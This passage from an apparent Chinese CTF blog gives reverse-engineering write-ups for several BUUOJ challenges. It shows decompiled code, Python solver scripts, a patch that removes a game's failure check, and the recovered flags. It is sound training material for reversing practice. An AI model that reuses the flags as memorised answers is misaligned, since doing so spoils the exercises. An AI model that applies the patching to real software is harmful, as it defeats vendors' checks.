here&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">_buffer = <span class="string">&quot;hahahaha_do_you_find_me?&quot;</span></span><br><span class="line">_403040 = [</span><br><span class="line"><span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x06</span>, <span class="number">0x13</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x3E</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x3C</span>, <span class="number">0x1F</span>, <span class="number">0x57</span>, <span class="number">0x14</span>, <span class="number">0x6B</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x0D</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(_403040)):</span><br><span class="line">  flag += <span class="built_in">chr</span>(_403040[_] ^ <span class="built_in">ord</span>(_buffer[_]))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到<code>flag&#123;d07abccf8a410c</code><br />缺了五个字符</p><p>看函数<code>finally</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">finally</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">9</span>]; <span class="comment">// [esp+13h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;%tp&amp;:&quot;</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  v4 = rand() % <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v3[*(_DWORD *)&amp;v3[<span class="number">5</span>]] != a1[*(_DWORD *)&amp;v3[<span class="number">5</span>]]) == v4 )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Really??? Did you find it?OMG!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;I hide the last part, you will not succeed!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看着有点发蒙, 感觉也没有在做什么正经的运算<br />v3的赋值算是给了一点点提示吧<br />奇奇怪怪的脑洞</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&quot;:&quot;</span>)^<span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x47&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">key = <span class="number">0x47</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;d07abccf8a410c&quot;</span></span><br><span class="line">v3 = <span class="string">&quot;%tp&amp;:&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> v3:</span><br><span class="line">  flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(_) ^ key)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{d07abccf8a410cb37a}</strong></p></blockquote><hr /><h1 id="equation"><a class="markdownIt-Anchor" href="#equation"></a> equation</h1><p>链接: <a href="https://buuoj.cn/challenges#equation">https://buuoj.cn/challenges#equation</a></p><p>Javascript</p><p>看着这道题莫名地会想到“高明的黑客”<br />没啥好说的, 直接放代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line">raw = <span class="built_in">open</span>(<span class="string">&quot;equation.html&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">data = re.findall(<span class="string">&quot;if\((.*)\)&quot;</span>, raw)[<span class="number">0</span>]</span><br><span class="line">data_list = data.split(<span class="string">&quot;&amp;&amp;&quot;</span>)</span><br><span class="line">exp_sum = []</span><br><span class="line">res_sum = []</span><br><span class="line"><span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data_list)):</span><br><span class="line">  test = data_list[cnt].split(<span class="string">&quot;==&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  equ = data_list[cnt].split(<span class="string">&quot;==&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">  res = [<span class="built_in">int</span>(execjs.<span class="built_in">eval</span>(equ))]</span><br><span class="line">  res_sum.append(res)</span><br><span class="line">  symbol = []</span><br><span class="line">  <span class="keyword">if</span> test.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">    symbol.append(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    symbol.append(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">  test = re.sub(<span class="string">&quot;\]\+l\[&quot;</span>, <span class="string">&quot; + &quot;</span>, test)</span><br><span class="line">  test = re.sub(<span class="string">&quot;\]\-l\[&quot;</span>, <span class="string">&quot; - &quot;</span>, test)</span><br><span class="line">  test = test.replace(<span class="string">&quot;l[&quot;</span>, <span class="string">&quot;&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">  symbol_temp = re.findall(<span class="string">&quot; ([\+\-]) &quot;</span>, test)</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> symbol_temp:</span><br><span class="line">    symbol.append(_)</span><br><span class="line">  test = re.sub(<span class="string">&quot; [\+\-] &quot;</span>, <span class="string">&quot; &quot;</span>,test)</span><br><span class="line">  jscode = test.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">  exp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>)]</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(jscode)):</span><br><span class="line">    seq = <span class="built_in">int</span>(execjs.<span class="built_in">eval</span>(jscode[_]))</span><br><span class="line">    <span class="keyword">if</span> symbol[_] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">      exp[seq] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> symbol[_] == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">      exp[seq] = -<span class="number">1</span></span><br><span class="line">  exp_sum.append(exp)</span><br><span class="line">b = Matrix(res_sum)</span><br><span class="line">x = Matrix(exp_sum)</span><br><span class="line">out = x.solve_right(b)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> out:</span><br><span class="line">  flag += <span class="built_in">chr</span>(_[<span class="number">0</span>])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><code>execjs.eval()</code>运行的速度好慢, 也懒得找能够代替这个函数的函数了<br />100次17s, 1638个字符串, 5分钟左右</p><hr /><h1 id="flareon5ultimate-minesweeper"><a class="markdownIt-Anchor" href="#flareon5ultimate-minesweeper"></a> [FlareOn5]Ultimate Minesweeper</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BFlareOn5%5DUltimate%20Minesweeper">https://buuoj.cn/challenges#[FlareOn5]Ultimate Minesweeper</a></p><p>.NET</p><p>先放IDA里看看<br />看到字符串<code>&quot;Congratulations!&quot;</code></p><p>查看引用这个字符串的函数, 然后用dnspy看这些函数</p><p><code>MainForm::SquareRevealedCallback</code></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UltimateMinesweeper.MainForm</span></span><br><span class="line"><span class="comment">// Token: 0x0600000C RID: 12 RVA: 0x00002348 File Offset: 0x00000548</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SquareRevealedCallback</span>(<span class="params">uint column, uint row</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.MineField.BombRevealed)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">this</span>.stopwatch.Stop();</span><br><span class="line">    Application.DoEvents();</span><br><span class="line">    Thread.Sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">new</span> FailurePopup().ShowDialog();</span><br><span class="line">    Application.Exit();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.RevealedCells.Add(row * MainForm.VALLOC_NODE_LIMIT + column);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.MineField.TotalUnrevealedEmptySquares == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">this</span>.stopwatch.Stop();</span><br><span class="line">    Application.DoEvents();</span><br><span class="line">    Thread.Sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">new</span> SuccessPopup(<span class="keyword">this</span>.GetKey(<span class="keyword">this</span>.RevealedCells)).ShowDialog();</span><br><span class="line">    Application.Exit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把判断失败的代码删掉再保存程序<br />找出三个点就能够进入过关的逻辑<br />但是flag的内容应该是与点击的格子相关<br />而且点的位置不是随机生成的<br />记下位置再玩一遍就能得到flag</p><blockquote><p><strong>flag{Ch3aters_Alw4ys_W1n@flare-on.com}</strong></p></blockquote><hr /><h1 id="2019红帽杯childre"><a class="markdownIt-Anchor" href="#2019红帽杯childre"></a> [2019红帽杯]childRE</h1><p>链接: <a href="https://buuoj.cn/challenges#%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DchildRE">https://buuoj.cn/challenges#[2019红帽杯]childRE</a></p><p>EXE 64</p><p>IDA中 <strong>main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> CHAR *v5; <span class="comment">// r11</span></span><br><span class="line">  __int64 v6; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">const</span> CHAR *v8; <span class="comment">// r10</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v13; <span class="comment">// r9</span></span><br><span class="line">  __int128 v14[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v14[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">  sub_140001080(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  v3 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v3;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)v14 + v3) );</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = sub_140001280(v14);</span><br><span class="line">  v5 = name;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1400015C0(*(_QWORD *)(v4 + <span class="number">8</span>));</span><br><span class="line">    sub_1400015C0(*(_QWORD *)(v6 + <span class="number">16</span>));</span><br><span class="line">    v7 = dword_1400057E0;</span><br><span class="line">    v5[dword_1400057E0] = *v8;</span><br><span class="line">    dword_1400057E0 = v7 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  UnDecorateSymbolName(v5, outputString, <span class="number">0x100</span>u, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v9;</span><br><span class="line">  <span class="keyword">while</span> ( outputString[v9] );</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">62</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1234567890Qwer[outputString[v13] % <span class="number">23</span>] != *(_BYTE *)(v13 + <span class="number">0x140003478</span>i64) )</span><br><span class="line">        _exit(v12);</span><br><span class="line">      <span class="keyword">if</span> ( a1234567890Qwer[outputString[v13] / <span class="number">23</span>] != *(_BYTE *)(v13 + <span class="number">0x140003438</span>i64) )</span><br><span class="line">        _exit(v12 * v12);</span><br><span class="line">      ++v12;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &lt; <span class="number">0x3E</span> );</span><br><span class="line">    sub_140001020(<span class="string">&quot;flag&#123;MD5(your input)&#125;\n&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = sub_1400018A0(<span class="built_in">std</span>::<span class="built_in">cout</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, sub_140001A60);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>0x140003478i64</code>即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000140003478 a46200860044218 db &#39;(_@4620!08!6_0*0442!@186%%0@3&#x3D;66!!974*3234&#x3D;&amp;0^3&amp;1@&#x3D;&amp;0908!6_0*&amp;&#39;,0</span><br></pre></td></tr></table></figure><p>先还原出outputString</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">_003478 = <span class="string">&quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;</span></span><br><span class="line">_003438 = <span class="string">&quot;55565653255552225565565555243466334653663544426565555525555222&quot;</span></span><br><span class="line">_0033A0 = <span class="string">&quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;ASDFGHJKL:\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&quot;</span></span><br><span class="line">output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> _003478]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(_003478)):</span><br><span class="line">  b = _0033A0.index(_003478[_])</span><br><span class="line">  a = _0033A0.index(_003438[_])</span><br><span class="line">  output[_] = <span class="built_in">chr</span>(<span class="number">23</span> * a + b)</span><br><span class="line">cipher = <span class="string">&quot;&quot;</span>.join(output)</span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure><p>得到结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)Traceback (most recent call last)</span><br></pre></td></tr></table></figure><p>然后是C++名字修饰<br />在一块实在没怎么了解过</p><blockquote><p><a href="https://www.freesion.com/article/6515734088/">https://www.freesion.com/article/6515734088/</a></p></blockquote><p>中间的函数貌似有替换字符串顺序<br />断点下到<code>UnDecorateSymbolName(v5, outputString, 0x100u, 0);</code>就能在寄存器看到替换顺序之后字符串</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">decorate = <span class="string">&quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;</span></span><br><span class="line">seq1 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_&quot;</span></span><br><span class="line">seq2 = <span class="string">&quot;PQHRSIDTUJVWKEBXYLZ[MF\\]N^_OGCA&quot;</span></span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> decorate]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">  cipher[_] = decorate[seq2.index(seq1[_])]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(cipher))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="string">&quot;&quot;</span>.join(cipher).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{63b148e750fed3a33419168ac58083f5}</strong></p></blockquote><hr /><h1 id="actf新生赛2020soullike"><a class="markdownIt-Anchor" href="#actf新生赛2020soullike"></a> [ACTF新生赛2020]SoulLike</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DSoulLike">https://buuoj.cn/challenges#[ACTF新生赛2020]SoulLike</a></p><p>ELF 64</p><p>IDA中 <strong>main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+7h] [rbp-B9h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-B4h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">14</span>]; <span class="comment">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">110</span>]; <span class="comment">// [rsp+4Ah] [rbp-76h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v9[<span class="number">6</span>]);  <span class="built_in">strcpy</span>(v9, <span class="string">&quot;actf&#123;&quot;</span>);</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v9[i] != v9[i + <span class="number">6</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">11</span>; ++j )</span><br><span class="line">    v8[j] = v9[j + <span class="number">11</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)sub_83A(v8) &amp;&amp; v9[<span class="number">23</span>] == <span class="number">125</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s true! flag is %s&quot;</span>, &amp;v9[<span class="number">6</span>]);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_16:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try another time...&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>sub_83A</code>代码过长<br />IDA无法反编译<br />需要修改文件<code>hexrays.cfg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAX_FUNCSIZE            &#x3D; 64        &#x2F;&#x2F; Functions over 64K are not decompiled</span><br></pre></td></tr></table></figure><p>这个数值改大点就行</p><p>反编译了<code>sub_83A</code>就知道该干嘛了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;r&quot;</span>).read().replace(<span class="string">&quot;  &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;u;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;*a1&quot;</span>, <span class="string">&quot;a1[0]&quot;</span>)</span><br><span class="line">data = re.sub(<span class="string">&quot;\+\+(.*)&quot;</span>, <span class="string">&quot;\\1 -= 1&quot;</span>, data).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">write = <span class="built_in">open</span>(<span class="string">&quot;data_re.py&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">write.write(<span class="string">&quot;a1 = [126, 50, 37, 88, 89, 107, 53, 110, 0, 19, 30, 56]\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data[::-<span class="number">1</span>]:</span><br><span class="line">  write.write(_+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">write.write(<span class="string">&quot;&quot;&quot;flag = &quot;flag&#123;&quot;</span></span><br><span class="line"><span class="string">for _ in a1:</span></span><br><span class="line"><span class="string">  flag += chr(_)</span></span><br><span class="line"><span class="string">flag += &quot;&#125;&quot;</span></span><br><span class="line"><span class="string">print(flag)&quot;&quot;&quot;</span>)</span><br><span 